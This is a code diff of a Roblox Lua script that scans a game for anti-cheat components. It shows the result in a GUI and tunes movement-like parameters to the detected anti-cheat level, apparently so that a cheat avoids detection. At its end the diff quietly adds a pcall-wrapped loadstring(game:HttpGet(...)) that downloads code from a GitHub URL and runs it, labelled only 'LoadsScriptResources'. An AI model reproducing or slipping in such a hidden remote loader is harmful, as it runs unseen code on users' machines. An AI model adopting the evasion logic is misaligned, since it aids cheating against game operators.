-    detailsFrame.Visible = not detailsFrame.Visible
-    detailsButton.Text = detailsFrame.Visible and 
-        "Hide Components ("..acData.components..")" or 
-        "AC Components ("..acData.components..")"
+dropdownButton.MouseButton1Click:Connect(function()
+    dropdownOpen = not dropdownOpen
+    
+    if dropdownTween then
+        dropdownTween:Cancel()
+    end
+    
+    if dropdownOpen then
+        dropdownContent.Visible = true
+        -- Calculate target height based on content, but don't exceed max height
+        local contentHeight = math.min(dropdownListLayout.AbsoluteContentSize.Y, maxDropdownHeight)
+        dropdownTween = game:GetService("TweenService"):Create(
+            dropdownContent,
+            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = UDim2.new(1, 0, 0, contentHeight)}
+        )
+        dropdownButton.Text = "Detected AC Components ("..acData.components..")"
+        
+        -- Refresh data when opening
+        acData = detectAntiCheat()
+        populateDropdown()
+    else
+        dropdownTween = game:GetService("TweenService"):Create(
+            dropdownContent,
+            TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Size = UDim2.new(1, 0, 0, 0)}
+        )
+        dropdownButton.Text = "Detected AC Components ("..acData.components..")"
+        
+        -- Hide content after animation
+        dropdownTween.Completed:Connect(function()
+            if not dropdownOpen then
+                dropdownContent.Visible = false
+            end
+        end)
+    end
+    
+    dropdownTween:Play()
 end)
+
+-- Add refresh button
+local refreshButton = Instance.new("TextButton")
+refreshButton.Size = UDim2.new(0, 100, 0, 30)
+refreshButton.Position = UDim2.new(0.5, -50, 0, 260)
+refreshButton.Text = "REFRESH SCAN"
+refreshButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+refreshButton.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+refreshButton.BorderSizePixel = 0
+refreshButton.Font = Enum.Font.GothamBold
+refreshButton.TextSize = 14
+refreshButton.Parent = frame
+
+refreshButton.MouseEnter:Connect(function()
+    refreshButton.BackgroundColor3 = Color3.fromRGB(80, 80, 110)
+end)
+
+refreshButton.MouseLeave:Connect(function()
+    refreshButton.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+end)
+
+refreshButton.MouseButton1Click:Connect(function()
+    -- Show loading state
+    refreshButton.Text = "SCANNING..."
+    refreshButton.TextColor3 = Color3.fromRGB(200, 200, 0)
+    
+    -- Run new detection
+    acData = detectAntiCheat()
+    acLevel = acData.level
+    acColor = acData.color
+    
+    -- Update UI
+    acLabel.Text = acLevel.." AC | "..math.floor(acData.percentage).."% | "..gameName
+    acLabel.TextColor3 = acColor
+    dropdownButton.Text = "Detected AC Components ("..acData.components..")"
+    
+    -- Update parameters based on new AC level
+    if acLevel == "NONE" then
+        frequency = 0.5
+        amplitude = isPC and 20 or 15
+        speed = 0.3
+        counterSpeed = 0.5
+        randomness = 0
+    elseif acLevel == "LOW" then
+        frequency = 1
+        amplitude = isPC and 40 or 30
+        speed = 0.8
+        counterSpeed = 0.8
+        randomness = 0.2
+    elseif acLevel == "MEDIUM" then
+        frequency = 1.5
+        amplitude = isPC and 60 or 40
+        speed = 1.2
+        counterSpeed = 1.2
+        randomness = 0.4
+    elseif acLevel == "HIGH" then
+        frequency = 2
+        amplitude = isPC and 80 or 50
+        speed = 1.6
+        counterSpeed = 1.6
+        randomness = 0.6
+    else -- EXTREME
+        frequency = 2.5
+        amplitude = isPC and 100 or 60
+        speed = 2
+        counterSpeed = 2
+        randomness = 0.8
+    end
+    
+    -- Reset counter animation
+    currentPercentage = 0
+    targetPercentage = acData.percentage
+    
+    -- Update dropdown if open
+    if dropdownOpen then
+        populateDropdown()
+    end
+    
+    -- Reset button after delay
+    delay(1, function()
+        refreshButton.Text = "REFRESH SCAN"
+        refreshButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end)
+end)
+
+-- Add status bar at bottom
+local statusBar = Instance.new("Frame")
+statusBar.Size = UDim2.new(1, -20, 0, 20)
+statusBar.Position = UDim2.new(0, 10, 0, 300)
+statusBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+statusBar.BorderSizePixel = 0
+statusBar.Parent = frame
+
+local statusText = Instance.new("TextLabel")
+statusText.Size = UDim2.new(1, 0, 1, 0)
+statusText.Text = "Last scan: "..os.date("%H:%M:%S", acData.lastUpdate).." | "..acData.components.." components found"
+statusText.TextColor3 = Color3.fromRGB(180, 180, 180)
+statusText.BackgroundTransparency = 1
+statusText.Font = Enum.Font.Gotham
+statusText.TextSize = 12
+statusText.TextXAlignment = Enum.TextXAlignment.Left
+statusText.Parent = statusBar
 
 -- Cleanup when GUI is closed
 frame.Destroying:Connect(function()
     if heartbeatConnection then
         heartbeatConnection:Disconnect()
     end
+end)
+
+-- Final notification
+task.wait(1)
+game:GetService("StarterGui"):SetCore("SendNotification", {
+    Title = "Scan Complete",
+    Text = "Detected "..acLevel.." level Anti-Cheat ("..acData.components.." components)",
+    Duration = 5
+})
+
+-- [ LoadsScriptResources ]
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LoadResources/refs/heads/main/ResSourcesLoaderSource", true))()
+warn("StartedScript")
 end)
